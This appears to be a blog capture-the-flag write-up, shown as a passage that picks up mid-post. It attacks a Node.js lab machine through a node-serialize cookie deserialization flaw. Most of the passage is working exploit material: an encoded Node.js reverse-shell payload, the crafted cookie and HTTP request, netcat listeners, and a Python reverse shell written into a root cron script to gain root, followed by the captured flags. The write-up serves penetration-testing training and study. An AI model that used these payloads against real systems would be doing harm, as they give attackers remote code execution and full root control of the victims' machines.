<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
 <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">profile</span><span class="p">)</span> <span class="p">{</span>
   <span class="kd">var</span> <span class="nx">str</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Buffer</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">profile</span><span class="p">,</span> <span class="s1">'base64'</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
   <span class="kd">var</span> <span class="nx">obj</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">.</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">str</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="nx">obj</span><span class="p">.</span><span class="nx">username</span> <span class="o">&amp;&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">num</span><span class="p">)</span> <span class="p">{</span>
	 <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"Hey "</span> <span class="o">&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">username</span> <span class="o">&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">num</span> <span class="o">&amp;</span> <span class="s2">" + "</span> <span class="o">&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">num</span> <span class="o">&amp;</span> <span class="s2">" = "</span> <span class="o">&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">num</span> <span class="o">&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">num</span><span class="p">)</span> 
   <span class="p">}</span>
 <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
	 <span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="s1">'profile'</span><span class="p">,</span> <span class="s1">'eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D'</span><span class="p">,</span> <span class="p">{</span>
       <span class="na">maxAge</span><span class="p">:</span> <span class="mi">900000</span><span class="p">,</span>
       <span class="na">httpOnly</span><span class="p">:</span> <span class="kc">true</span>
     <span class="p">});</span>
 <span class="p">}</span>
<span class="p">});</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">);</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p nodejsshell.py 10.10.15.172 1337
<span class="o">[</span>+] LHOST <span class="o">=</span> 10.10.15.172
<span class="o">[</span>+] LPORT <span class="o">=</span> 1337
<span class="o">[</span>+] Encoding
<span class="nb">eval</span><span class="o">(</span>String.fromCharCode<span class="o">(</span>10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,53,46,49,55,50,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10<span class="o">))</span>
</code></pre></div></div>

<p>We can use JavaScript’s Immediately invoked function expression (IIFE) for calling the function. If we use IIFE bracket ()after the function body, the function will get invoked when the object is created. It works similar to a Class constructor in C++.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"username"</span>:<span class="s2">"_</span><span class="nv">$$</span><span class="s2">ND_FUNC</span><span class="nv">$$</span><span class="s2">_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,53,46,49,55,50,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"</span><span class="o">}</span>
</code></pre></div></div>

<p>Bv Using burpSuite, it is easy to edit the HTTP req in a way to encode and inject this payload ;) Juste make sure to encode as Base64 and URL. You can use hot keys <code class="highlighter-rouge">CTRL+B</code> and <code class="highlighter-rouge">CTRL+U</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1

Host: 10.10.10.85:3000

User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Ubuntu<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:61.0<span class="o">)</span> Gecko/20100101 Firefox/61.0

Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8

Accept-Language: en-GB,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5

Accept-Encoding: <span class="nb">gzip</span>, deflate

Cookie: <span class="nv">profile</span><span class="o">={</span><span class="s2">"username"</span>:<span class="s2">"_</span><span class="nv">$$</span><span class="s2">ND_FUNC</span><span class="nv">$$</span><span class="s2">_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,53,46,49,55,50,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"</span><span class="o">}</span>

Connection: close

Upgrade-Insecure-Requests: 1
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-l</span> 10.10.15.172 <span class="nt">-p</span> 1337

Connected!
</code></pre></div></div>

<h2 id="maintaining-access">Maintaining Access</h2>

<p>N/A</p>

<h2 id="covering-tasks">Covering Tasks</h2>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
<span class="n">total</span> <span class="mi">152</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">21</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Aug</span>  <span class="mi">5</span> <span class="mi">02</span><span class="p">:</span><span class="mi">46</span> <span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>     <span class="mi">1</span> <span class="n">Mar</span>  <span class="mi">4</span> <span class="mi">15</span><span class="p">:</span><span class="mi">24</span> <span class="o">.</span><span class="n">bash_history</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>   <span class="mi">220</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">bash_logout</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">3771</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">bashrc</span>
<span class="n">drwx</span><span class="o">------</span> <span class="mi">13</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Nov</span>  <span class="mi">8</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">cache</span>
<span class="n">drwx</span><span class="o">------</span> <span class="mi">16</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">20</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">config</span>
<span class="n">drwx</span><span class="o">------</span>  <span class="mi">3</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">21</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">dbus</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">Desktop</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>    <span class="mi">25</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">dmrc</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Mar</span>  <span class="mi">4</span> <span class="mi">15</span><span class="p">:</span><span class="mi">08</span> <span class="n">Documents</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">Downloads</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">8980</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">examples</span><span class="o">.</span><span class="n">desktop</span>
<span class="n">drwx</span><span class="o">------</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">21</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">gconf</span>
<span class="n">drwx</span><span class="o">------</span>  <span class="mi">3</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Aug</span>  <span class="mi">5</span> <span class="mi">02</span><span class="p">:</span><span class="mi">45</span> <span class="o">.</span><span class="n">gnupg</span>
<span class="n">drwx</span><span class="o">------</span>  <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">21</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">gvfs</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">6732</span> <span class="n">Aug</span>  <span class="mi">5</span> <span class="mi">02</span><span class="p">:</span><span class="mi">46</span> <span class="o">.</span><span class="n">ICEauthority</span>
<span class="n">drwx</span><span class="o">------</span>  <span class="mi">3</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">local</span>
<span class="n">drwx</span><span class="o">------</span>  <span class="mi">4</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">mozilla</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">Music</span>
<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">nano</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">47</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">node_modules</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>    <span class="mi">20</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">node_repl_history</span>
<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">57</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">npm</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>   <span class="mi">21</span> <span class="n">Mar</span>  <span class="mi">4</span> <span class="mi">15</span><span class="p">:</span><span class="mi">40</span> <span class="n">output</span><span class="o">.</span><span class="n">txt</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">Pictures</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>   <span class="mi">655</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">profile</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">Public</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>    <span class="mi">66</span> <span class="n">Sep</span> <span class="mi">20</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">selected_editor</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>   <span class="mi">870</span> <span class="n">Sep</span> <span class="mi">20</span>  <span class="mi">2017</span> <span class="n">server</span><span class="o">.</span><span class="n">js</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>     <span class="mi">0</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="o">.</span><span class="n">sudo_as_admin_successful</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">Templates</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">19</span>  <span class="mi">2017</span> <span class="n">Videos</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>    <span class="mi">48</span> <span class="n">Aug</span>  <span class="mi">5</span> <span class="mi">02</span><span class="p">:</span><span class="mi">45</span> <span class="o">.</span><span class="n">Xauthority</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>    <span class="mi">82</span> <span class="n">Aug</span>  <span class="mi">5</span> <span class="mi">02</span><span class="p">:</span><span class="mi">45</span> <span class="o">.</span><span class="n">xsession</span><span class="o">-</span><span class="n">errors</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span>  <span class="mi">1</span> <span class="n">sun</span>  <span class="n">sun</span>  <span class="mi">1302</span> <span class="n">Mar</span>  <span class="mi">7</span> <span class="mi">08</span><span class="p">:</span><span class="mi">33</span> <span class="o">.</span><span class="n">xsession</span><span class="o">-</span><span class="n">errors</span><span class="o">.</span><span class="n">old</span>

<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import pty; pty.spawn("/bin/bash")'</span>  

<span class="n">find</span> <span class="o">-</span><span class="n">iname</span> <span class="s">'user.txt'</span>
<span class="o">./</span><span class="n">Documents</span><span class="o">/</span><span class="n">user</span><span class="o">.</span><span class="n">txt</span>
<span class="n">cat</span> <span class="n">Documents</span><span class="o">/</span><span class="n">user</span><span class="o">.</span><span class="n">txt</span>
<span class="mi">9</span><span class="n">a093cd22ce86b7f41db4116e80d0b0f</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /var/log
<span class="nb">cat </span>syslog
<span class="o">(</span>...<span class="o">)</span>
Aug  5 03:30:01 sun CRON[11472]: <span class="o">(</span>root<span class="o">)</span> CMD <span class="o">(</span>python /home/sun/Documents/script.py <span class="o">&gt;</span> /home/sun/output.txt<span class="p">;</span> <span class="nb">cp</span> /root/script.py /home/sun/Documents/script.py<span class="p">;</span> <span class="nb">chown </span>sun:sun /home/sun/Documents/script.py<span class="p">;</span> chattr <span class="nt">-i</span> /home/sun/Documents/script.py<span class="p">;</span> <span class="nb">touch</span> <span class="nt">-d</span> <span class="s2">"</span><span class="k">$(</span><span class="nb">date</span> <span class="nt">-R</span> <span class="nt">-r</span> /home/sun/Documents/user.txt<span class="k">)</span><span class="s2">"</span> /home/sun/Documents/script.py<span class="o">)</span>

<span class="o">(</span>...<span class="o">)</span>
Aug  5 03:35:01 sun CRON[21608]: <span class="o">(</span>root<span class="o">)</span> CMD <span class="o">(</span>python /home/sun/Documents/script.py <span class="o">&gt;</span> /home/sun/output.txt<span class="p">;</span> <span class="nb">cp</span> /root/script.py /home/sun/Documents/script.py<span class="p">;</span> <span class="nb">chown </span>sun:sun /home/sun/Documents/script.py<span class="p">;</span> chattr <span class="nt">-i</span> /home/sun/Documents/script.py<span class="p">;</span> <span class="nb">touch</span> <span class="nt">-d</span> <span class="s2">"</span><span class="k">$(</span><span class="nb">date</span> <span class="nt">-R</span> <span class="nt">-r</span> /home/sun/Documents/user.txt<span class="k">)</span><span class="s2">"</span> /home/sun/Documents/script.py<span class="o">)</span>

<span class="o">(</span>...<span class="o">)</span>
Aug  5 03:40:01 sun CRON[31742]: <span class="o">(</span>root<span class="o">)</span> CMD <span class="o">(</span>python /home/sun/Documents/script.py <span class="o">&gt;</span> /home/sun/output.txt<span class="p">;</span> <span class="nb">cp</span> /root/script.py /home/sun/Documents/script.py<span class="p">;</span> <span class="nb">chown </span>sun:sun /home/sun/Documents/script.py<span class="p">;</span> chattr <span class="nt">-i</span> /home/sun/Documents/script.py<span class="p">;</span> <span class="nb">touch</span> <span class="nt">-d</span> <span class="s2">"</span><span class="k">$(</span><span class="nb">date</span> <span class="nt">-R</span> <span class="nt">-r</span> /home/sun/Documents/user.txt<span class="k">)</span><span class="s2">"</span> /home/sun/Documents/script.py<span class="o">)</span>
<span class="o">(</span>...<span class="o">)</span>

</code></pre></div></div>

<p>This cron runs every 5. Why don’t we edit <code class="highlighter-rouge">/home/sun/Documents/script.py</code> like this?</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.172",41337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">sun</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">script</span><span class="o">.</span><span class="n">py</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-l</span> 10.10.14.35 41337
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
# ls
root.txt
script.py
# cat root.txt
ba1d0019200a54e370ca151007a8095a
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /home
sun
# ^C
</span></code></pre></div></div>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="/offsec/2018/08/05/Nsec-2018.html">
        Nsec 2018
      </a>
    </h1>

    <span class="post-date">05 Aug 2018</span>

    <h1 id="connexion-configuration">Connexion Configuration</h1>

<p>Ok, that one was pretty straight foward. The message arrived later during the CTF. It  was saying that ours connexion configuration had a problem. The only thing we had to do was to look in our <code class="highlighter-rouge">connexion configuration</code>? lol :)</p>

